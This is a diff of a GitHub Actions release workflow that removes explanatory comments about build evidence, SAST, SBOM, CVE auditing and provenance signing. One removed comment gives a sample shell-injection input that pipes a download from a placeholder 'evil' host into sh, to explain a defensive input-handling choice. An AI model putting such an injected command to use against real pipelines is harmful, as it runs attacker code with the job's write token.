@@ -1,24 +1,8 @@
 name: Release
 
-# Stage 8. "Release with all evidence as versioned artefacts."
-#
-# The gates in ci.yml and supply-chain.yml decide whether a commit is fit to
-# ship. This workflow's job is to make that decision auditable afterwards: for
-# every tag it produces the binary, the bill of materials, the lockfile that
-# pins the graph, and the output of every gate - then signs the lot and
-# attaches it to a GitHub Release.
-#
-# The distinction that matters: an Actions artefact expires after 90 days and
-# is bound to a workflow run. A release asset with a provenance attestation is
-# bound to a version, and stays verifiable after everyone who ran the pipeline
-# has forgotten it existed.
-
 on:
   push:
     tags: ['v*']
-  # Dry runs. Produces and uploads the bundle as a workflow artefact without
-  # creating a Release, so the evidence path can be exercised without burning a
-  # version number on it.
   workflow_dispatch:
     inputs:
       version:
@@ -26,8 +10,6 @@ on:
         required: false
         default: 'v0.0.0-dryrun'
 
-# Read-only at the top; the release job below holds the write scopes. Same
-# effective permissions today, but a job added later starts from read-only.
 permissions:
   contents: read
 
@@ -39,24 +21,19 @@ jobs:
     name: Build, collect evidence, publish
     runs-on: ubuntu-24.04
     permissions:
-      contents: write          # create the Release and upload assets
-      id-token: write          # keyless signing
-      attestations: write      # SLSA provenance
-      actions: read            # look up the CI run for the tagged commit
+      contents: write
+      id-token: write
+      attestations: write
+      actions: read
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
-          fetch-depth: 0   # the changelog below walks tag history
+          fetch-depth: 0
 
       - name: Set up Conan
         uses: $/.github/actions/setup-conan
 
-      # The dispatch input reaches the shell through env, never through ${{ }}
-      # template expansion: expanded inline it becomes part of the script, so
-      # an input like `v1"; curl evil | sh; "` would run with this job's
-      # contents:write token. It is also checked against a SemVer tag shape,
-      # because every later step uses it in file names and git refs.
       - name: Resolve version
         id: version
         env:
@@ -78,9 +55,6 @@ jobs:
           echo "stem=ttg-${version}-linux-x86_64" >> "$GITHUB_OUTPUT"
           echo "Releasing $version (dry run: $dry_run)"
 
-          # The tag and the version in conanfile.py must agree. A release
-          # labelled v0.2.0 whose SBOM says 0.1.0 is worse than no SBOM: the
-          # evidence contradicts the artefact it describes.
           declared=$(python -c "import re,pathlib;print(re.search(r'version\s*=\s*\"([^\"]+)\"',pathlib.Path('conanfile.py').read_text()).group(1))")
           echo "conanfile.py declares: $declared"
           if [ "$dry_run" = "false" ] && [ "${version#v}" != "$declared" ]; then
@@ -88,12 +62,6 @@ jobs:
             exit 1
           fi
 
-      # A tag is not a review. Anyone who can push one could otherwise ship a
-      # commit that never went through the pipeline - and this workflow re-runs
-      # the unit tests and SAST, but not the sanitizers, the coverage build or
-      # the format and workflow audits. So the full pipeline (pipeline.yml:
-      # CI + supply chain) must already be green on exactly this commit. A dry run only warns, so the path stays usable
-      # from a branch whose CI has not finished.
       - name: Require green CI on this commit
         env:
           GH_TOKEN: ${{ github.token }}
@@ -112,31 +80,16 @@ jobs:
             fi
           fi
 
-      # No dependency cache in a release build. A cache entry written by an
-      # earlier, less trusted run would flow straight into a signed artefact;
-      # both dependencies are header-only, so resolving them fresh costs
-      # seconds.
-      #
-      # Versioned packages, not the runner's default `clang-tidy`: a runner
-      # image bump that moved the default to a newer major would change the
-      # findings under the gate, and .sast-baseline.txt would suddenly be
-      # wrong without a single source line having changed. Bump on purpose,
-      # together with the baseline.
       - name: Install analyzers
         run: |
           sudo apt-get update
           sudo apt-get install -y clang-tidy-18 cppcheck
 
-      # --lockfile spelled out: Conan would also pick up ./conan.lock on its
-      # own, but a release should not depend on a default nobody reads.
       - name: Resolve dependency graph (conan.lock)
         run: |
           conan install . --build=missing -of build -s build_type=Release \
             --lockfile=conan.lock --lockfile-out=build/conan.lock
 
-      # Configure only. This host tree exists for clang-tidy's compilation
-      # database and for the coverage build below; the binary that ships comes
-      # from the Dockerfile (next steps), not from here.
       - name: Configure (compilation database for SAST)
         run: |
           cmake -S . -B build -G Ninja \
@@ -147,16 +100,6 @@ jobs:
       - name: Prepare evidence directory
         run: mkdir -p evidence
 
-      # Build once. The tarball used to be built here on the Ubuntu runner,
-      # while the image was built by the Dockerfile on Debian 12: two compilers,
-      # two glibc versions, and a release whose binary was not the one in the
-      # image. Both now come out of the same Dockerfile build stage - Debian 12
-      # glibc, static libstdc++, hardening verified in the stage itself - so the
-      # tarball runs wherever the image's binary runs.
-      #
-      # The test stage builds the suite with that same toolchain and the same
-      # lockfile, and its log goes into the evidence: results produced by the
-      # compiler that produced the shipped binary, from the exact tree tagged.
       - name: Test with the shipping toolchain (Dockerfile test stage)
         run: |
           set -o pipefail
@@ -172,9 +115,6 @@ jobs:
           docker rm "$cid"
           file build-release/ttg_server
 
-      # -------------------------------------------------------------------
-      # Stage 3 evidence
-      # -------------------------------------------------------------------
       - name: Static analysis
         run: |
           set +e
@@ -189,16 +129,10 @@ jobs:
           set -e
           [ "$tidy_status" -le 1 ] || { echo "::error::clang-tidy failed ($tidy_status)"; exit 1; }
           [ "$cppcheck_status" -eq 0 ] || { echo "::error::cppcheck failed ($cppcheck_status)"; exit 1; }
-          # pipefail is essential here: without it the exit status of the whole
-          # pipeline is tee's, which is always 0, and the gate silently stops
-          # gating while still writing a report that says it failed.
           set -o pipefail
           python scripts/sast_gate.py check --baseline .sast-baseline.txt \
             evidence/clang-tidy.txt evidence/cppcheck.txt | tee evidence/sast-gate.txt
 
-      # -------------------------------------------------------------------
-      # Stage 4 + 7 evidence
-      # -------------------------------------------------------------------
       - name: Generate SBOM (CycloneDX)
         run: ./scripts/sbom.sh -o evidence/sbom.cdx.json
 
@@ -213,9 +147,6 @@ jobs:
           CONAN_AUDIT_TOKEN: ${{ secrets.CONAN_AUDIT_TOKEN }}
         run: |
           if [ -z "$CONAN_AUDIT_TOKEN" ]; then
-            # Unlike a pull request, a release has no excuse for a missing
-            # token: shipping a version whose dependencies were never checked
-            # against a CVE database is the exact thing this stage exists for.
             echo "::error::CONAN_AUDIT_TOKEN is not set - refusing to cut a release without a CVE scan."
             exit 1
           fi
@@ -223,10 +154,6 @@ jobs:
           conan audit scan . --context host --severity-level 7.0 \
             -s build_type=Release -f json --out-file evidence/conan-audit.json
 
-      # -------------------------------------------------------------------
-      # Stage 5 evidence. Coverage is recorded, not gated - but a release
-      # bundle that states the number is how the number stays honest.
-      # -------------------------------------------------------------------
       - name: Coverage report
         run: |
           conan install . --build=missing -of build-cov -s build_type=Debug
@@ -242,9 +169,6 @@ jobs:
             --xml-pretty --output evidence/coverage.xml
           cat evidence/coverage.txt
 
-      # -------------------------------------------------------------------
-      # The artefact itself
-      # -------------------------------------------------------------------
       - name: Stage the binary
         id: binary
         env:
@@ -256,15 +180,11 @@ jobs:
           cp build-release/ttg_server "dist/$stem/"
           cp README.md LICENSE SECURITY.md "dist/$stem/"
           strip --strip-unneeded "dist/$stem/ttg_server"
-          # Checked again after strip, on the file that actually ships.
           scripts/check_hardening.sh "dist/$stem/ttg_server" | tee evidence/hardening.txt
           tar -czf "dist/${stem}.tar.gz" -C dist "$stem"
           echo "tarball=dist/${stem}.tar.gz" >> "$GITHUB_OUTPUT"
           ls -la dist/
 
-      # Last step that writes into evidence/, so every file the report hashes
-      # is final. It lands in the bundle and is covered by its provenance
-      # attestation: the report is signed together with what it describes.
       - name: Compliance report (CRA / BSI TR-03183-2)
         env:
           VERSION: ${{ steps.version.outputs.version }}
@@ -282,8 +202,6 @@ jobs:
           version="$VERSION"
           bundle="dist/ttg-${version}-evidence.tar.gz"
 
-          # An index so the bundle is readable without knowing this workflow.
-          # Whoever opens it in two years is auditing a release, not reading CI.
           cat > evidence/MANIFEST.md <<MANIFEST
           # Release evidence - ${version}
 
@@ -323,9 +241,6 @@ jobs:
           sha256sum *.tar.gz > SHA256SUMS
           cat SHA256SUMS
 
-      # Provenance binds "this file" to "this workflow, this commit, this
-      # runner". Verifiable later with:
-      #   gh attestation verify <file> -R <owner>/<repo>
       - name: Attest build provenance
         uses: actions/attest-build-provenance@e8998f949152b193b063cb0ec769d69d929409be # v2.4.0
         with:
@@ -407,8 +322,6 @@ jobs:
           } > release-notes.md
           cat release-notes.md >> "$GITHUB_STEP_SUMMARY"
 
-      # Dry runs stop here: everything above has been exercised, but no
-      # Release is created and no version number is consumed.
       - name: Upload artefacts (dry run)
         if: steps.version.outputs.dry_run == 'true'
         uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
